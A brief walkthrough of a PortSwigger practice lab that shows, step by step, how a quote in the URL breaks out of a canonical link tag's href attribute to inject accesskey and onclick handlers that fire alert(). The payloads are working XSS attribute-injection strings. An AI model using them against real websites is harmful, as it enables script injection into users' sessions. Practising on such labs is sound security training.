# Lab: Reflected XSS in canonical link tag
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

```bash
# Change this link
.web-security-academy.net
# into this:
.web-security-academy.net/?abc1234

# View page source:
<link rel="canonical" href='https://....web-security-academy.net/?abc1234'/>
```
```bash
# Change link
web-security-academy.net/?'onclick='alert()

<link rel="canonical" href='https://....web-security-academy.net/?'onclick='alert()'/>

# We used onclick but we can't physically click on it so we need to use access keys.
```

```bash
web-security-academy.net/?'accesskey='x'onclick='alert()

<link rel="canonical" href='https://....web-security-academy.net/?'accesskey='x'onclick='alert()

# If you press option(alt) + shift + x it might work for you.
# If it doesn't work try other accesskeys to see alert.
```
